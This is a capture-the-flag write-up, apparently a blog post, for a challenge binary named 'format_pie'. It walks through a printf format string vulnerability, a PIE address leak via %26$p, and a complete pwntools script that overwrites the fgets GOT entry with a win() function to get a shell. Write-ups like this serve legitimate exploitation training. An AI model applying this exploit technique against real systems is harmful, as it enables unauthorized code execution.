+++
date = '2026-01-02T10:39:59+05:30'
draft = false
title = 'A Slice Of Lemon Pie'
+++

Let's run `checksec` on the binary and see what protections it has. 

```
quix@quixel:~$ checksec --file=format_pie
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   48 Symbols        No    0               2               format_pie
```

- PIE,NX and canary are all enabled. 
- Partial RELRO means that we can overwrite a GOT entry. 

We can also see that the binary contains a win function that spawns a shell for us:

```
unsigned __int64 win()
{
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  puts("Congratulations! Here is your shell.");
  system("/bin/sh");
  return v1 - __readfsqword(0x28u);
}
```

Let's take a look at the vuln function:

```
unsigned __int64 vuln()
{
  char s[264]; // [rsp+0h] [rbp-110h] BYREF
  unsigned __int64 v2; // [rsp+108h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  do
  {
    printf("> ");
    if ( !fgets(s, 256, stdin) )
      break;
    printf(s);
  }
  while ( strncmp(s, "exit", 4u) );
  return v2 - __readfsqword(0x28u);
}
```

## The plan 

The most obvious glaring issue is `printf(s)`, this is a format string vulnerability. My plan is to overwrite the GOT entry for `fgets` with `win`.


But to do that, we first need to leak a binary address due to the presense of PIE, which randomises the binary address on each run. 


The great thing about format strings is that they provide a way for us to both read and write to memory. 
- We can read memory by using `%p` to print the address of a variable. 
- We can write to memory by using `%n` to write to a variable. 


To successfully run the exploit, we would need to find:

- The GOT entry for `fgets` and `win`
- The offset at which our input starts in the format string 
- an offset that provides us a leak of the binary address 

## Calculating the start of our input 

```
quix@quixel:~$ ./format_pie
Welcome to the Format Pie Shop!
We serve pies with a side of addresses.
> AAAAAAAA %p %p %p %p %p %p %p %p %p %p
AAAAAAAA 0x7dd26dc03963 0xfbad208b 0x7fff3b7ec840 0x1 (nil) 0x4141414141414141 0x2520702520702520 0x2070252070252070 0x7025207025207025 0xa702520702520
``` 

We can see that our input("AAAAAAAAA"), is at offset 6. This is needed to generate the final payload. 

## Leaking a binary address 

Using more `%p`'s we can leak an address that corresponds to the binary 

```
> %26$p
0x555555556060
```

To verify the address: 
```
[addr = `0x555555556060`]
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /home/quix/format_pie
```

## Putting it all together

Once we are able to get these, we can calculate the base of the binary from our leak. Then we can calculate the offset to the GOT entry for `fgets` and `win` and write the address of `win` to it. 

We will use the `fmtstr_payload()` function in pwntools to automatically generate the paylaod that will overwrite the GOT entry. 

The full exploit: 

```
from pwn import *

context.binary = ELF('./format_pie')
context.arch = 'amd64'

elf = context.binary

LEAK_INDEX = 26          # %26$p leaks a PIE pointer
FMT_OFFSET = 6           # first controllable fmt argument

PIE_LEAK_OFFSET = 0x2060
WIN_OFFSET      = 0x1221
FGETS_GOT_OFF   = 0x4020


#p = remote('34.93.66.31',30409)
p = process("./format_pie")


p.sendlineafter(b'> ', f'%{LEAK_INDEX}$p'.encode())
leak = int(p.recvline().strip(), 16)

pie_base = leak - PIE_LEAK_OFFSET

log.success(f'PIE base: {hex(pie_base)}')

win_addr   = pie_base + WIN_OFFSET
fgets_got  = pie_base + FGETS_GOT_OFF

log.success(f'win():      {hex(win_addr)}')
log.success(f'fgets@GOT: {hex(fgets_got)}')

payload = fmtstr_payload(
    FMT_OFFSET,
    {fgets_got: win_addr},
    write_size='short'
)

p.sendlineafter(b'> ', payload)

p.interactive()
```

This gives us our shell. Note that offsets may vary depending on the libc version that you use. 